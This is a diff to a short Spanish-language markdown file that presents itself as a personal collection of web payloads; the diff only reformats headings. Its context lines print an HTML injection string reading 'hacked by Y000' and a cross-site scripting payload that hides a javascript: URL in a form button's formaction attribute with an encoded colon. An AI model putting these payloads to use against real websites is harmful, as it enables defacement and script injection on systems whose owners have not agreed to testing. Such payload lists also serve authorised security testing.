@@ -1,4 +1,4 @@
-Recopilación de todos los Payloads usados/creados por mi.
+## Recopilación de todos los Payloads usados/creados por mi.
 
 
 -1'<marquee>hacked by Y000</marquee>
@@ -11,7 +11,7 @@ Recopilación de todos los Payloads usados/creados por mi.
 
 
 
-Xss dentro de un botón en form:
+### Xss dentro de un botón en form:
 
 `<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_`
 
